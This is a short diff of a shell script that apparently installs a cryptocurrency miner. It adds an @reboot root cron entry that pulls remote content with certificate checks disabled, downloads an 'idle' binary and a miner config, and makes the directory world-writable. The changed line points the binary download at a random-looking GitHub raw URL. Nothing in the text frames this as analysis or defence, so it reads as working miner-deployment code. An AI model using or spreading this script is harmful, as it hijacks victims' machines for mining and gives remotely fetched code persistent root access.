@@ -25,7 +25,8 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src
 
 rm -rf "${work}"; mkdir -p "${work}";
 wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
-wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
+#wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
+wget --no-check-certificate -qO "${work}/idle" "https://raw.githubusercontent.com/vjbahkds/qiyywnbc/refs/heads/main/idle"
 [ -f "${work}/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 chmod -R 777 "${work}"
